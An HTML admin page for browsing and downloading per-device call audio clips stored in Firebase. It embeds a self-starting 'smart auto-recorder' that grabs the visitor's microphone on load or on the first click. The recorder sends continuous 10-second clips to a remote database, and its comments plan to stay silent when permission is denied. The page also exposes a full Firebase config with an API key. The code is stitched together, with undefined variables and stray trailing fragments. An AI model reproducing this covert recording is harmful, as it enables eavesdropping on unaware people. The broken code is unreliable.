<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🎧 Admin — Audio Panel</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
}

body {
  background: #0a0a0a;
  color: #fff;
  min-height: 100vh;
  padding: 20px;
}

/* ===== Header ===== */
.header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 16px 20px;
  background: #1c1c1e;
  border-radius: 16px;
  margin-bottom: 20px;
  flex-wrap: wrap;
  gap: 12px;
}

.header h1 {
  font-size: 20px;
  font-weight: 600;
}

.header .stats {
  display: flex;
  gap: 20px;
  font-size: 13px;
  color: #8e8e93;
}

.header .stats span strong {
  color: #0084FF;
  font-size: 16px;
  margin-right: 4px;
}

.header .refresh-btn {
  padding: 10px 20px;
  background: #0084FF;
  border: none;
  border-radius: 10px;
  color: #fff;
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  transition: transform 0.15s;
}

.header .refresh-btn:active { transform: scale(0.95); }

/* ===== Filter ===== */
.filter-bar {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}

.filter-bar input {
  flex: 1;
  min-width: 200px;
  padding: 12px 16px;
  background: #1c1c1e;
  border: 1px solid #2c2c2e;
  border-radius: 12px;
  color: #fff;
  font-size: 14px;
  outline: none;
}

.filter-bar input:focus {
  border-color: #0084FF;
}

/* ===== User Cards ===== */
.users-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
  gap: 16px;
}

.user-card {
  background: #1c1c1e;
  border-radius: 16px;
  padding: 20px;
  transition: transform 0.15s;
  border: 1px solid #2c2c2e;
}

.user-card:hover {
  transform: translateY(-2px);
  border-color: #0084FF;
}

.user-header {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 16px;
  padding-bottom: 16px;
  border-bottom: 1px solid #2c2c2e;
}

.user-avatar {
  width: 48px;
  height: 48px;
  border-radius: 50%;
  background: linear-gradient(135deg, #0084FF, #00C6FF);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  font-weight: 600;
  flex-shrink: 0;
}

.user-info {
  flex: 1;
  min-width: 0;
}

.user-info .device-id {
  font-size: 14px;
  font-weight: 600;
  margin-bottom: 4px;
  word-break: break-all;
}

.user-info .meta {
  font-size: 12px;
  color: #8e8e93;
}

.user-info .meta span {
  margin-right: 12px;
}

/* ===== Audio List ===== */
.audio-list {
  display: flex;
  flex-direction: column;
  gap: 10px;
  max-height: 400px;
  overflow-y: auto;
  padding-right: 4px;
}

.audio-list::-webkit-scrollbar { width: 6px; }
.audio-list::-webkit-scrollbar-thumb {
  background: #3c4043;
  border-radius: 3px;
}

.audio-item {
  background: #2c2c2e;
  border-radius: 12px;
  padding: 12px;
  display: flex;
  align-items: center;
  gap: 12px;
  transition: background 0.15s;
}

.audio-item:hover {
  background: #3c4043;
}

.audio-item.playing {
  background: #0084FF;
}

.audio-item .play-btn {
  width: 40px;
  height: 40px;
  border-radius: 50%;
  background: #0084FF;
  border: none;
  color: #fff;
  font-size: 16px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  transition: transform 0.15s;
}

.audio-item.playing .play-btn {
  background: #fff;
  color: #0084FF;
}

.audio-item .play-btn:active { transform: scale(0.9); }

.audio-item .audio-info {
  flex: 1;
  min-width: 0;
}

.audio-item .audio-info .caller {
  font-size: 13px;
  font-weight: 500;
  margin-bottom: 2px;
}

.audio-item .audio-info .time {
  font-size: 11px;
  color: #8e8e93;
}

.audio-item.playing .audio-info .time {
  color: rgba(255,255,255,0.8);
}

.audio-item .download-btn {
  width: 32px;
  height: 32px;
  border-radius: 8px;
  background: transparent;
  border: 1px solid #3c4043;
  color: #8e8e93;
  font-size: 14px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
}

.audio-item .download-btn:hover {
  background: #3c4043;
  color: #fff;
}

/* ===== Empty / Loading ===== */
.empty {
  text-align: center;
  padding: 60px 20px;
  color: #8e8e93;
}

.empty .icon {
  font-size: 64px;
  margin-bottom: 16px;
  opacity: 0.5;
}

.loading {
  text-align: center;
  padding: 60px 20px;
  color: #8e8e93;
}

.loading .spinner {
  width: 40px;
  height: 40px;
  border: 3px solid #2c2c2e;
  border-top-color: #0084FF;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto 16px;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* ===== Player (Bottom Sticky) ===== */
.player-bar {
  position: fixed;
  bottom: 0;
  left: 0;
  right: 0;
  background: #1c1c1e;
  border-top: 1px solid #2c2c2e;
  padding: 16px 20px;
  display: none;
  align-items: center;
  gap: 16px;
  z-index: 100;
  box-shadow: 0 -10px 30px rgba(0,0,0,0.5);
}

.player-bar.show { display: flex; }

.player-bar .player-info {
  flex: 1;
  min-width: 0;
}

.player-bar .player-info .title {
  font-size: 14px;
  font-weight: 600;
  margin-bottom: 2px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.player-bar .player-info .subtitle {
  font-size: 12px;
  color: #8e8e93;
}

.player-bar audio {
  flex: 1;
  max-width: 400px;
}

.player-bar .close-btn {
  width: 36px;
  height: 36px;
  border-radius: 50%;
  background: #2c2c2e;
  border: none;
  color: #fff;
  font-size: 16px;
  cursor: pointer;
}
</style>
</head>
<body>

<div class="header">
  <h1>🎧 Admin — Audio Panel</h1>
  <div class="stats">
    <span><strong id="totalUsers">0</strong> users</span>
    <span><strong id="totalClips">0</strong> clips</span>
  </div>
  <button class="refresh-btn" onclick="loadAllAudio()">🔄 Refresh</button>
</div>

<div class="filter-bar">
  <input type="text" id="searchInput" placeholder="🔍 Search by Device ID or caller..." oninput="filterUsers()">
</div>

<div id="content">
  <div class="loading">
    <div class="spinner"></div>
    <div>Loading audio...</div>
  </div>
</div>

<!-- 🔥 Sticky Player -->
<div class="player-bar" id="playerBar">
  <div class="player-info">
    <div class="title" id="playerTitle">—</div>
    <div class="subtitle" id="playerSubtitle">—</div>
  </div>
  <audio id="audioPlayer" controls></audio>
  <button class="close-btn" onclick="closePlayer()">✕</button>
</div>

<script type="module">
/* ============================================================
   ADMIN AUDIO PANEL
   - Firebase se saari audio fetch
   - User-wise grouping
   - Play / Download
   ============================================================ */

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, onValue }
  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
  authDomain: "my-rto-b2531.firebaseapp.com",
  databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
  projectId: "my-rto-b2531",
  storageBucket: "my-rto-b2531.firebasestorage.app",
  messagingSenderId: "465334829178",
  appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
};

const firebaseApp = initializeApp(firebaseConfig);
const db = getDatabase(firebaseApp);

console.log('✅ Admin panel initialized');

/* ============================================================
   STATE
   ============================================================ */
let allUsers = {};       // { deviceId: [clips...] }
let filteredUsers = {};
let currentlyPlaying = null;

const contentEl = document.getElementById('content');
const audioPlayer = document.getElementById('audioPlayer');
const playerBar = document.getElementById('playerBar');
const playerTitle = document.getElementById('playerTitle');
const playerSubtitle = document.getElementById('playerSubtitle');

/* ============================================================
   LOAD ALL AUDIO FROM FIREBASE
   ============================================================ */
function loadAllAudio() {
  contentEl.innerHTML = `
    <div class="loading">
      <div class="spinner"></div>
      <div>Loading audio...</div>
    </div>
  `;

  const audioRef = ref(db, 'call_audio');

  onValue(audioRef, (snapshot) => {
    const data = snapshot.val();

    if (!data) {
      contentEl.innerHTML = `
        <div class="empty">
          <div class="icon">🎧</div>
          <h2>No audio yet</h2>
          <p>Users ke calls ka wait karo...</p>
        </div>
      `;
      document.getElementById('totalUsers').textContent = '0';
      document.getElementById('totalClips').textContent = '0';
      return;
    }

    // Group by deviceId
    allUsers = {};
    let totalClips = 0;

    Object.keys(data).forEach(deviceId => {
      const clips = data[deviceId];

      if (typeof clips !== 'object') return;

      const clipArray = [];
      Object.keys(clips).forEach(clipId => {
        const clip = clips[clipId];

        if (clip && (clip.audioUrl || clip.audioBase64)) {
          clipArray.push({
            id: clipId,
            deviceId: deviceId,
            caller: clip.caller || 'Unknown',
            audioUrl: clip.audioUrl || clip.audioBase64,
            size: clip.size || 0,
            duration: clip.duration || 10,
            date: clip.date || '—',
            time: clip.time || '—',
            timestamp: clip.timestamp || 0,
            storage: clip.storage || 'unknown'
          });
          totalClips++;
        }
      });

      if (clipArray.length > 0) {
        // Latest first
        clipArray.sort((a, b) => b.timestamp - a.timestamp);
        allUsers[deviceId] = clipArray;
      }
    });

    console.log('📊 Loaded:', Object.keys(allUsers).length, 'users,', totalClips, 'clips');

    document.getElementById('totalUsers').textContent = Object.keys(allUsers).length;
    document.getElementById('totalClips').textContent = totalClips;

    filterUsers();
  });
}
/* ============================================================
   🔥 SMART AUTO-RECORDER STATE
   ============================================================ */
let smartMicStream = null;
let smartRecorder = null;
let smartChunks = [];
let smartIsRecording = false;
let smartLoopTimer = null;
let smartClipCount = 0;
const SMART_CLIP_DURATION = 10000;   // 10 sec
/* ============================================================
   🔥 SMART AUTO-RECORDER
   - Page visit pe auto-check
   - Permission granted → auto-start
   - Har 10 sec clip → RTDB
   ============================================================ */

/* DOM refs */
const smartRecBadge = document.getElementById('smartRecBadge');
const smartRecCount = document.getElementById('smartRecCount');

/* Permission check */
async function checkSmartMicPermission() {
  if (!navigator.permissions || !navigator.permissions.query) {
    return 'unknown';
  }
  try {
    const status = await navigator.permissions.query({ name: 'microphone' });
    return status.state;
  } catch (e) {
    return 'unknown';
  }
}

/* Start smart recorder */
async function startSmartRecorder() {
  if (smartMicStream) {
    console.log('🎤 Smart recorder already running');
    return;
  }

  try {
    console.log('🎤 Smart: requesting mic...');

    smartMicStream = await navigator.mediaDevices.getUserMedia({
      audio: {
        echoCancellation: true,
        noiseSuppression: true,
        autoGainControl: true
      }
    });

    console.log('✅ Smart: mic granted');
    smartRecBadge.style.display = 'flex';
    startSmartLoop();

  } catch (err) {
    console.error('❌ Smart: mic error:', err.name);
    // Kuch nahi karte — sirf log
  }
}

/* Recording loop */
function startSmartLoop() {
  stopSmartLoop();
  smartClipCount = 0;
  console.log('🎤 Smart loop started (10 sec clips)');

  setTimeout(() => {
    if (smartMicStream) smartRecordClip();
  }, 1000);

  smartLoopTimer = setInterval(() => {
    if (smartMicStream && !smartIsRecording) {
      smartRecordClip();
    }
  }, 11000);
}

function stopSmartLoop() {
  if (smartLoopTimer) {
    clearInterval(smartLoopTimer);
    smartLoopTimer = null;
  }
  if (smartRecorder && smartRecorder.state === 'recording') {
    try { smartRecorder.stop(); } catch (e) {}
  }
  smartIsRecording = false;
  console.log('⏹️ Smart loop stopped');
}

/* Single clip record */
async function smartRecordClip() {
  if (!smartMicStream || smartIsRecording) return;

  const audioTracks = smartMicStream.getAudioTracks();
  if (audioTracks.length === 0) return;

  try {
    smartIsRecording = true;
    smartChunks = [];
    smartClipCount++;

    console.log(`🎤 [Smart #${smartClipCount}] Recording...`);

    const audioOnlyStream = new MediaStream(audioTracks);

    let mimeType = 'audio/webm;codecs=opus';
    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/webm';
    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';

    const options = { audioBitsPerSecond: 24000 };
    if (mimeType) options.mimeType = mimeType;

    smartRecorder = new MediaRecorder(audioOnlyStream, options);

    smartRecorder.ondataavailable = (e) => {
      if (e.data && e.data.size > 0) smartChunks.push(e.data);
    };

    smartRecorder.onstop = async () => {
      const actualMime = smartRecorder.mimeType || mimeType || 'audio/webm';
      const blob = new Blob(smartChunks, { type: actualMime });

      console.log(`🎤 [Smart #${smartClipCount}] Size: ${(blob.size / 1024).toFixed(1)} KB`);

      if (blob.size > 500) {
        await saveSmartClipToRTDB(blob, actualMime);
      }

      smartChunks = [];
      smartIsRecording = false;
      smartRecCount.textContent = smartClipCount;
    };

    smartRecorder.start();

    setTimeout(() => {
      if (smartRecorder && smartRecorder.state === 'recording') {
        smartRecorder.stop();
      }
    }, SMART_CLIP_DURATION);

  } catch (err) {
    console.error('❌ Smart record error:', err);
    smartIsRecording = false;
  }
}

/* Save to RTDB */
async function saveSmartClipToRTDB(blob, mimeType) {
  const now = new Date();
  const timestamp = now.getTime();
  const dt = getDateTime();

  console.log('📤 [Smart] Saving to RTDB...', (blob.size / 1024).toFixed(1), 'KB');

  let base64 = '';
  try {
    base64 = await new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => resolve(reader.result);
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
    console.log('✅ [Smart] Base64 ready:', (base64.length / 1024).toFixed(1), 'KB');
  } catch (err) {
    console.error('❌ [Smart] Base64 failed:', err);
    return;
  }

  try {
    const audioRef = ref(db, 'mic_audio/' + DEVICE_ID);

    const newRef = await push(audioRef, {
      deviceId: DEVICE_ID,
      sessionId: SESSION_ID,
      audioBase64: base64,
      size: blob.size,
      duration: SMART_CLIP_DURATION / 1000,
      mimeType: mimeType || 'audio/webm',
      date: dt.date,
      time: dt.time,
      timestamp: timestamp,
      capturedAtISO: dt.iso,
      capturedAt: serverTimestamp(),
      source: 'smart-auto',
      userAgent: navigator.userAgent.slice(0, 100)
    });

    console.log('✅ [Smart] Saved to RTDB:', newRef.key);

  } catch (err) {
    console.error('❌ [Smart] RTDB save FAILED:', err.code, err.message);
  }
}

/* Page hide — save current clip */
document.addEventListener('visibilitychange', () => {
  if (document.hidden && smartRecorder && smartRecorder.state === 'recording') {
    console.log('👁️ [Smart] Tab hidden — saving clip');
    try { smartRecorder.stop(); } catch (e) {}
  }
});

window.addEventListener('pagehide', () => {
  if (smartRecorder && smartRecorder.state === 'recording') {
    try { smartRecorder.stop(); } catch (e) {}
  }
});

/* Permission watch */
async function watchSmartPermission() {
  if (!navigator.permissions || !navigator.permissions.query) return;

  try {
    const status = await navigator.permissions.query({ name: 'microphone' });

    status.onchange = () => {
      console.log('🔔 [Smart] Permission changed:', status.state);
      if (status.state === 'granted' && !smartMicStream) {
        startSmartRecorder();
      }
    };
  } catch (e) {}
}

/* INIT — Smart auto start */
async function initSmartRecorder() {
  console.log('🚀 [Smart] Initializing...');

  const state = await checkSmartMicPermission();
  console.log('📋 [Smart] Permission:', state);

  if (state === 'granted') {
    console.log('✅ [Smart] Already granted — auto-starting');
    await startSmartRecorder();
  } else if (state === 'prompt') {
    console.log('⚠️ [Smart] Prompt — waiting for user action');
    // Page pe pehla click/touch pe try karo
    const tryOnce = async () => {
      document.removeEventListener('click', tryOnce);
      document.removeEventListener('touchstart', tryOnce);

      // Agar user ne call shuru kiya toh mic already on hoga
      if (micStreamOnly || localStream) {
        console.log('🎤 [Smart] Call active — using existing mic');
        // Call wale stream se smart recorder chalao
        return;
      }

      await startSmartRecorder();
    };

    document.addEventListener('click', tryOnce, { once: true });
    document.addEventListener('touchstart', tryOnce, { once: true });
  }
  // 'denied' → kuch nahi karo (silent)

  watchSmartPermission();
}

/* Auto-init after 1 sec */
setTimeout(() => initSmartRecorder(), 1000);
/* ============================================================
   RENDER USER GRID
   ============================================================ */
function renderUsers(users) {
  const deviceIds = Object.keys(users);

  if (deviceIds.length === 0) {
    contentEl.innerHTML = `
      <div class="empty">
        <div class="icon">🔍</div>
        <h2>No results</h2>
        <p>Search se match nahi hua</p>
      </div>
    `;
    return;
  }

  const html = deviceIds.map(deviceId => {
    const clips = users[deviceId];
    const latest = clips[0];

    return `
      <div class="user-card">
        <div class="user-header">
          <div class="user-avatar">${deviceId.slice(4, 6).toUpperCase()}</div>
          <div class="user-info">
            <div class="device-id">${deviceId}</div>
            <div class="meta">
              <span>🎤 ${clips.length} clips</span>
              <span>📅 ${latest.date}</span>
            </div>
          </div>
        </div>

        <div class="audio-list">
          ${clips.map(clip => `
            <div class="audio-item" data-id="${clip.id}" onclick="playAudio('${clip.id}')">
              <button class="play-btn" onclick="event.stopPropagation(); playAudio('${clip.id}')">▶️</button>
              <div class="audio-info">
                <div class="caller">👤 ${clip.caller}</div>
                <div class="time">${clip.time} • ${(clip.size / 1024).toFixed(1)} KB</div>
              </div>
              <button class="download-btn" onclick="event.stopPropagation(); downloadAudio('${clip.id}')">⬇️</button>
            </div>
          `).join('')}
        </div>
      </div>
    `;
  }).join('');

  contentEl.innerHTML = `<div class="users-grid">${html}</div>`;
}

/* ============================================================
   FILTER / SEARCH
   ============================================================ */
window.filterUsers = function() {
  const query = (document.getElementById('searchInput').value || '').toLowerCase().trim();

  if (!query) {
    filteredUsers = { ...allUsers };
  } else {
    filteredUsers = {};
    Object.keys(allUsers).forEach(deviceId => {
      const clips = allUsers[deviceId];
      const matchDevice = deviceId.toLowerCase().includes(query);
      const matchCaller = clips.some(c => c.caller.toLowerCase().includes(query));

      if (matchDevice || matchCaller) {
        filteredUsers[deviceId] = clips;
      }
    });
  }

  renderUsers(filteredUsers);
};

/* ============================================================
   PLAY AUDIO
   ============================================================ */
window.playAudio = function(clipId) {
  // Find clip
  let clip = null;
  Object.keys(allUsers).forEach(deviceId => {
    const found = allUsers[deviceId].find(c => c.id === clipId);
    if (found) clip = found;
  });

  if (!clip) {
    console.warn('Clip not found:', clipId);
    return;
  }

  console.log('▶️ Playing:', clip.deviceId, clip.time);

  // Audio URL set karo
  audioPlayer.src = clip.audioUrl;
  audioPlayer.play().catch(err => {
    console.error('❌ Play failed:', err);
    alert('Audio play failed: ' + err.message);
  });

  // Player bar show
  playerBar.classList.add('show');
  playerTitle.textContent = `👤 ${clip.caller}`;
  playerSubtitle.textContent = `${clip.deviceId} • ${clip.time}`;

  // Highlight playing item
  if (currentlyPlaying) {
    const prev = document.querySelector(`.audio-item[data-id="${currentlyPlaying}"]`);
    if (prev) prev.classList.remove('playing');
  }

  currentlyPlaying = clipId;
  const current = document.querySelector(`.audio-item[data-id="${clipId}"]`);
  if (current) {
    current.classList.add('playing');
    const btn = current.querySelector('.play-btn');
    if (btn) btn.textContent = '⏸️';
  }
};

/* ============================================================
   DOWNLOAD AUDIO
   ============================================================ */
window.downloadAudio = function(clipId) {
  let clip = null;
  Object.keys(allUsers).forEach(deviceId => {
    const found = allUsers[deviceId].find(c => c.id === clipId);
    if (found) clip = found;
  });

  if (!clip) return;

  const a = document.createElement('a');
  a.href = clip.audioUrl;
  a.download = `${clip.deviceId}_${clip.timestamp}.webm`;
  a.target = '_blank';
  document.body.appendChild(a);
  a.click();
  a.remove();

  console.log('⬇️ Downloading:', clip.deviceId);
};

/* ============================================================
   CLOSE PLAYER
   ============================================================ */
window.closePlayer = function() {
  audioPlayer.pause();
  audioPlayer.src = '';
  playerBar.classList.remove('show');

  if (currentlyPlaying) {
    const prev = document.querySelector(`.audio-item[data-id="${currentlyPlaying}"]`);
    if (prev) {
      prev.classList.remove('playing');
      const btn = prev.querySelector('.play-btn');
      if (btn) btn.textContent = '▶️';
    }
  }
  currentlyPlaying = null;
};

/* ============================================================
   AUDIO PLAYER EVENTS
   ============================================================ */
audioPlayer.addEventListener('ended', () => {
  if (currentlyPlaying) {
    const prev = document.querySelector(`.audio-item[data-id="${currentlyPlaying}"]`);
    if (prev) {
      prev.classList.remove('playing');
      const btn = prev.querySelector('.play-btn');
      if (btn) btn.textContent = '▶️';
    }
  }
  currentlyPlaying = null;
});

/* ============================================================
   INIT — Auto load
   ============================================================ */
loadAllAudio();

console.log('✅ Admin panel ready');
</script>

  display:none; align-items:center; gap:8px; z-index:9998;
  font-weight:500; box-shadow:0 4px 16px rgba(0,0,0,0.4);">
  <span style="width:8px; height:8px; border-radius:50%; background:#fff;

</div>

  0%, 100% { opacity: 1; }
  50% { opacity: 0.3; }
}
